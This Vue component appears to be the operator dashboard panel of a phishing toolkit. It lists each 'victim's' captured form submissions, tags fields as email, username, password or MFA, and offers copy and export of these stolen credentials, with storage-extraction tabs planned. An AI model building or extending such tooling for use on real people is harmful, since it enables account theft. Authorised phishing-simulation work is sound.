<script setup>
import { ref, computed, watch } from 'vue'
import Tabs from 'primevue/tabs'
import TabList from 'primevue/tablist'
import Tab from 'primevue/tab'
import TabPanels from 'primevue/tabpanels'
import TabPanel from 'primevue/tabpanel'
import DataTable from 'primevue/datatable'
import Column from 'primevue/column'
import Button from 'primevue/button'
import InputText from 'primevue/inputtext'
import Tag from 'primevue/tag'
import { useToast } from 'primevue/usetoast'
import { backendService } from '@/services/backend'
import { useVisibilityPolling } from '@/composables/useVisibilityPolling'

const props = defineProps({
    victim: Object,
    active: {
        type: Boolean,
        default: false
    }
})

const toast = useToast()
const activeTab = ref('4')

const clientInfo = ref({})
const formSubmissions = ref([])
const loadingForms = ref(false)
const searchQuery = ref('')
const formSearchQuery = ref('')

// Computed filtered data
const filteredClientInfo = computed(() => {
    if (!searchQuery.value) return formatClientInfo()
    const query = searchQuery.value.toLowerCase()
    const info = formatClientInfo()
    return info.filter(item =>
        item.key?.toLowerCase().includes(query) ||
        item.value?.toString().toLowerCase().includes(query)
    )
})

// Filter form submissions using their URL and captured fields.
const filteredFormSubmissions = computed(() => {
    if (!formSearchQuery.value) return formattedForms.value
    const query = formSearchQuery.value.toLowerCase()
    return formattedForms.value.filter(form =>
        form.url?.toLowerCase().includes(query) ||
        Object.values(form.fields || {}).some(v =>
            String(v).toLowerCase().includes(query)
        )
    )
})

// Normalize form submissions for the data table.
const formattedForms = computed(() => {
    return formSubmissions.value.map(form => {
        return {
            id: form.id,
            timestamp: form.timestamp || form.collected_at,
            url: form.url || 'Unknown',
            hostname: form.hostname || '',
            fields: form.payload?.fields || form.fields || {}
        }
    })
})

const fetchFormSubmissions = async (signal) => {
    if (props.victim && props.victim.id) {
        if (formSubmissions.value.length === 0) loadingForms.value = true
        try {
            const submissions = await backendService.getVictimEvents(
                props.victim.campaign_id,
                props.victim.id,
                'form_submission',
                { signal }
            )
            formSubmissions.value = submissions
        } catch (error) {
            if (error?.name === 'AbortError') return
            console.error("Error fetching form submissions:", error)
        } finally {
            loadingForms.value = false
        }
    }
}

// Convert client metadata into rows.
function formatClientInfo() {
    if (!clientInfo.value || Object.keys(clientInfo.value).length === 0) {
        return []
    }

    return Object.entries(clientInfo.value)
        .map(([key, value]) => ({
            key: formatKeyName(key),
            value: typeof value === 'object' ? JSON.stringify(value, null, 2) : value
        }))
}

// Convert an internal metadata key to a readable label.
function formatKeyName(key) {
    return key
        .split('_')
        .map(word => word.charAt(0).toUpperCase() + word.slice(1))
        .join(' ')
}

// Keep local metadata synchronized with the selected victim.
watch(() => props.victim, (victim) => {
    if (!victim) return
    clientInfo.value = victim.metadata || {}
}, { deep: true, immediate: true })

// Methods
function copyToClipboard(text) {
    navigator.clipboard.writeText(text)
    toast.add({
        severity: 'success',
        summary: 'Copied',
        detail: 'Value copied to clipboard',
        life: 2000
    })
}

function exportData() {
    downloadJSON(clientInfo.value, 'client_info.json')
    toast.add({
        severity: 'success',
        summary: 'Export',
        detail: 'Exporting client info...',
        life: 2000
    })
}

// Export form submissions as JSON.
function exportFormData() {
    downloadJSON(formattedForms.value, `forms_${props.victim?.id || 'export'}.json`)
    toast.add({
        severity: 'success',
        summary: 'Exported',
        detail: `${formattedForms.value.length} form submissions exported`,
        life: 2000
    })
}

function downloadJSON(data, filename) {
    const jsonString = JSON.stringify(data, null, 2)
    const blob = new Blob([jsonString], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = url
    link.download = filename
    link.click()
    URL.revokeObjectURL(url)
}

function truncateValue(value, maxLength = 80) {
    if (!value) return ''
    if (typeof value !== 'string') value = JSON.stringify(value)
    if (value.length <= maxLength) return value
    return value.substring(0, maxLength) + '...'
}

// Format timestamps consistently for table rows.
function formatTimestamp(timestamp) {
    if (!timestamp) return 'N/A'
    return new Date(timestamp).toLocaleString('en-US', {
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    })
}

// Map captured field types to PrimeVue severities.
function getFieldTypeSeverity(type) {
    const severityMap = {
        email: 'success',
        username: 'success',
        password: 'danger',
        mfa: 'warning',
        other: 'secondary'
    }
    return severityMap[type] || 'secondary'
}

useVisibilityPolling(fetchFormSubmissions, {
    intervalMs: 10000,
    enabled: () => props.active
})
</script>

<template>
    <div class="data-panel">
        <div class="panel-header">
            <h4>💾 Extracted Data</h4>
            <div class="header-actions">
                <IconField iconPosition="left">
                    <InputIcon>
                        <i class="pi pi-search" />
                    </InputIcon>
                    <InputText
                        v-model="searchQuery"
                        placeholder="Search..."
                    />
              </IconField>
                <Button
                    label="Export"
                    icon="pi pi-download"
                    size="small"
                    @click="exportData"
                    :disabled="Object.keys(clientInfo).length === 0"
                />
            </div>
        </div>

        <Tabs v-model:value="activeTab">
            <TabList>
                <Tab value="1" disabled>
                    <i class="pi pi-database"></i>
                    <span>LocalStorage</span>
                    <Tag value="Soon" severity="info" class="tab-badge" />
                </Tab>
                <Tab value="2" disabled>
                    <i class="pi pi-clock"></i>
                    <span>SessionStorage</span>
                    <Tag value="Soon" severity="info" class="tab-badge" />
                </Tab>
                <Tab value="3">
                    <i class="pi pi-file-edit"></i>
                    <span>Form Data ({{ formSubmissions.length }})</span>
                </Tab>
                <Tab value="4">
                    <i class="pi pi-desktop"></i>
                    <span>Client Info ({{ Object.keys(clientInfo).length }})</span>
                </Tab>
            </TabList>

            <TabPanels>
                <!-- LocalStorage Tab -->
                <TabPanel value="1">
                    <div class="coming-soon">
                        <i class="pi pi-clock"></i>
                        <h5>Coming Soon</h5>
                        <p>LocalStorage extraction will be available soon</p>
                    </div>
                </TabPanel>

                <!-- SessionStorage Tab -->
                <TabPanel value="2">
                    <div class="coming-soon">
                        <i class="pi pi-clock"></i>
                        <h5>Coming Soon</h5>
                        <p>SessionStorage extraction will be available soon</p>
                    </div>
                </TabPanel>

                <!-- ✅ Form Data Tab -->
                <TabPanel value="3">
                    <div class="tab-actions">
                        <span class="p-input-icon-left">
                            <i class="pi pi-search" style="margin-right: 10px;"/>
                            <InputText
                                v-model="formSearchQuery"
                                placeholder="Search forms..."
                                size="small"
                            />
                        </span>
                        <Button
                            label="Export Forms"
                            icon="pi pi-download"
                            size="small"
                            outlined
                            :disabled="formSubmissions.length === 0"
                            @click="exportFormData"
                        />
                    </div>

                    <div v-if="loadingForms && formSubmissions.length === 0" class="form-loading" aria-label="Loading form submissions">
                        <Skeleton v-for="index in 4" :key="index" height="2.5rem" borderRadius="6px" />
                    </div>

                    <DataTable
                        v-else
                        :value="filteredFormSubmissions"
                        stripedRows
                        :paginator="filteredFormSubmissions.length > 5"
                        :rows="5"
                        class="data-table"
                        sortField="timestamp"
                        :sortOrder="-1"
                    >
                        <Column field="timestamp" header="Time" sortable style="min-width: 150px">
                            <template #body="{ data }">
                                <span class="timestamp">{{ formatTimestamp(data.timestamp) }}</span>
                            </template>
                        </Column>

                        <Column field="url" header="URL" style="min-width: 250px">
                            <template #body="{ data }">
                                <code class="url-code">{{ truncateValue(data.url, 50) }}</code>
                            </template>
                        </Column>

                        <Column header="Credentials" style="min-width: 300px">
                            <template #body="{ data }">
                                <div class="creds-cell">
                                    <div class="creds-list">
                                        <div
                                            v-for="(fieldObj, fieldName) in data.fields"
                                            :key="fieldName"
                                            class="cred-item"
                                        >
                                            <Tag
                                                :value="fieldObj.type"
                                                :severity="getFieldTypeSeverity(fieldObj.type)"
                                                class="field-tag"
                                            />
                                            <code class="cred-value">{{ truncateValue(fieldObj.value, 30) }}</code>
                                            <Button
                                                icon="pi pi-copy"
                                                text
                                                rounded
                                                size="small"
                                                @click="copyToClipboard(fieldObj.value)"
                                                v-tooltip.left="'Copy value'"
                                            />
                                        </div>
                                    </div>
                                </div>
                            </template>
                        </Column>


                        <template #empty>
                            <div class="empty-table">
                                <i class="pi pi-inbox"></i>
                                <p>No form submissions captured</p>
                            </div>
                        </template>
                    </DataTable>
                </TabPanel>

                <!-- Client Info Tab -->
                <TabPanel value="4">
                    <div class="tab-actions">
                        <Button
                            label="Export Client Info"
                            icon="pi pi-download"
                            size="small"
                            outlined
                            :disabled="Object.keys(clientInfo).length === 0"
                            @click="exportData"
                        />
                    </div>

                    <DataTable
                        :value="filteredClientInfo"
                        stripedRows
                        :paginator="filteredClientInfo.length > 10"
                        :rows="10"
                        class="data-table"
                    >
                        <Column field="key" header="Property" style="min-width: 200px">
                            <template #body="{ data }">
                                <span class="data-name">{{ data.key }}</span>
                            </template>
                        </Column>

                        <Column field="value" header="Value" style="min-width: 300px">
                            <template #body="{ data }">
                                <div class="value-cell">
                                    <code>{{ truncateValue(data.value) }}</code>
                                    <Button
                                        icon="pi pi-copy"
                                        text
                                        rounded
                                        size="small"
                                        @click="copyToClipboard(data.value)"
                                    />
                                </div>
                            </template>
                        </Column>

                        <template #empty>
                            <div class="empty-table">
                                <i class="pi pi-inbox"></i>
                                <p>No client info captured</p>
                            </div>
                        </template>
                    </DataTable>
                </TabPanel>
            </TabPanels>
        </Tabs>
    </div>
</template>

<style scoped>
.data-panel {
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

.panel-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.panel-header h4 {
    font-size: 1rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0;
}

.header-actions {
    display: flex;
    gap: 0.75rem;
    align-items: center;
}

.tab-actions {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 1rem;
    gap: 0.75rem;
}

.form-loading {
    display: flex;
    flex-direction: column;
    gap: 0.5rem;
}

.tab-badge {
    margin-left: 0.5rem;
}

.data-table {
    border: 1px solid var(--color-border);
    border-radius: 6px;
    overflow: hidden;
}

.data-table :deep(.p-datatable-tbody > tr) {
    transition: background-color 0.2s;
}

.data-name {
    font-weight: 600;
    color: var(--color-heading);
}

.value-cell {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    justify-content: space-between;
}

.value-cell code {
    flex: 1;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.8rem;
    color: var(--color-text);
    background-color: var(--color-background-mute);
    padding: 0.25rem 0.5rem;
    border-radius: 4px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

/* ✅ Form Data Styles */
.timestamp {
    font-size: 0.85rem;
    color: var(--color-text-mute);
    font-family: 'JetBrains Mono', monospace;
}

.url-code {
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.75rem;
    color: var(--color-text);
    background-color: var(--color-background-mute);
    padding: 0.25rem 0.5rem;
    border-radius: 4px;
}

.creds-cell {
    display: flex;
    align-items: flex-start;
    gap: 0.5rem;
    justify-content: space-between;
}

.creds-list {
    display: flex;
    flex-direction: column;
    gap: 0.5rem;
    flex: 1;
}

.cred-item {
    display: flex;
    align-items: center;
    gap: 0.5rem;
}

.field-tag {
    font-size: 0.7rem;
    min-width: 70px;
}

.cred-value {
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.75rem;
    color: var(--color-text);
    background-color: var(--color-background-mute);
    padding: 0.25rem 0.5rem;
    border-radius: 4px;
    flex: 1;
}

.empty-table {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 0.75rem;
    padding: 3rem;
    color: var(--color-text-mute);
}

.empty-table i {
    font-size: 2.5rem;
    opacity: 0.5;
}

.empty-table p {
    margin: 0;
    font-size: 0.875rem;
}

.coming-soon {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 1rem;
    padding: 4rem;
    color: var(--color-text-mute);
    background: linear-gradient(135deg, var(--color-background-mute) 0%, var(--color-background) 100%);
    border-radius: 6px;
}

.coming-soon i {
    font-size: 3rem;
    opacity: 0.6;
    animation: pulse 2s infinite;
}

.coming-soon h5 {
    font-size: 1.25rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0.5rem 0 0 0;
}

.coming-soon p {
    margin: 0.5rem 0 0 0;
    font-size: 0.9rem;
}

@keyframes pulse {
    0%, 100% {
        opacity: 0.6;
    }
    50% {
        opacity: 1;
    }
}

.data-panel :deep(.p-tabpanels) {
    /* border: 1px solid var(--color-border); */
    border-top: none;
    border-radius: 0 0 6px 6px;
    background-color: var(--color-background);
    padding: 1.5rem;
}

.data-panel :deep(.p-tablist) {
    background-color: var(--color-background-mute);
    border-bottom: 1px solid var(--color-border);
}

.data-panel :deep(.p-tab) {
    display: flex;
    align-items: center;
    gap: 0.5rem;
}

.data-panel :deep(.p-tab[aria-disabled="true"]) {
    opacity: 0.6;
    cursor: not-allowed;
}
</style>
